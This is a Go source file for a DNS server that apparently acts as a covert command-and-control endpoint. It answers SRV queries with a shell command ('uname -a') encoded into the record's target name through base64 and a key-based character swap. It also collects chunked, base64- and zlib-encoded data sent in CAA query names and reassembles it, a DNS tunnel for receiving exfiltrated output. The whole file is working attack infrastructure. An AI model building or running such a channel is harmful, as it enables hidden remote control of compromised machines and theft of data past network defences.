package main

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"slices"
	"sort"
	"strconv"
	"strings"

	"github.com/miekg/dns"
)

var PRIORITY = 1024
var PORT = 5210

func encode(s string, key string) string {
	s = base64.StdEncoding.EncodeToString([]byte(s))

	dec := reverse(key)
	log.Printf("encode input=%q enc=%q dec=%q", s, key, dec)

	pairs := []string{}
	for i, k := range key {
		pairs = append(pairs, string(k))
		pairs = append(pairs, string(dec[i]))
	}

	repl := strings.NewReplacer(pairs...)
	k := repl.Replace(s)
	k = strings.ReplaceAll(k, " ", "__")
	s = "_loc_." + k + ".local."

	log.Printf("encoded: %s", s)
	return s
}

func reverse(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

// decode decompresses content
func decode(msg []byte) ([]byte, error) {
	log.Printf("decode: %s", msg)

	compressed, err := base64.StdEncoding.DecodeString(string(msg))
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	r := bytes.NewReader(compressed)
	z, err := zlib.NewReader(r)
	if err != nil {
		return nil, err
	}

	defer z.Close()
	decompressed, err := ioutil.ReadAll(z)
	if err != nil {
		return nil, err
	}
	buf.Write(decompressed)
	return buf.Bytes(), nil
}

func nameKey(s string) string {
	// _toletan._zamicrus.local
	s = strings.ReplaceAll(s, "_", "")
	s = strings.ReplaceAll(s, ".", "")
	s = strings.ReplaceAll(s, ".local", "")
	log.Printf("key name: %s", s)

	letters := []string{}
	for _, c := range s {
		letters = append(letters, string(c))
	}

	sort.Strings(letters)
	uniq := slices.Compact(letters)
	log.Printf("uniq key: %s", uniq)

	key := strings.Join(uniq[0:6], "") + " "
	return key
}

var buf = map[string][]byte{}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range r.Question {
		if q.Qtype == dns.TypeSRV {
			name := strings.TrimRight(q.Name, ".")
			// Respond with a SRV record for example.com
			log.Printf("name: %q", name)
			key := nameKey(name)
			cmd := "uname -a"
			log.Printf("sending: %q", cmd)
			srv := &dns.SRV{
				Hdr:      dns.RR_Header{Name: q.Name, Rrtype: dns.TypeSRV, Class: dns.ClassINET, Ttl: 3600},
				Priority: 1024,
				Weight:   5210,
				Port:     8080,
				Target:   encode(cmd, key),
			}
			m.Answer = append(m.Answer, srv)
		}
		if q.Qtype == dns.TypeCAA {
			log.Printf("content: %q", q.Name)

			caa := &dns.CAA{
				Hdr:   dns.RR_Header{Name: q.Name, Rrtype: dns.TypeCAA, Class: dns.ClassINET, Ttl: 3600},
				Value: "OK",
			}
			m.Answer = append(m.Answer, caa)
			parts := strings.Split(q.Name, ".")
			id := parts[0]
			total, err := strconv.Atoi(parts[1])
			if err != nil {
				log.Printf("unable to convert %q to int", parts[1])
				continue
			}

			chunk := parts[2]
			buf[id] = append(buf[id], []byte(chunk)...)
			log.Printf("%d of %d: %s", len(buf[id]), total, chunk)
			if len(buf[id]) == total-1 {
				content, err := decode(buf[id])
				log.Printf("decode %v: %s", err, content)
			}
		}

	}

	// log.Printf("response: %+v", m)
	w.WriteMsg(m)
}

func main() {
	dns.HandleFunc(".", handleRequest)

	port := "53"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}

	server := &dns.Server{Addr: ":" + port, Net: "udp"}
	fmt.Printf("Starting DNS server on port %s...\n", port)
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}
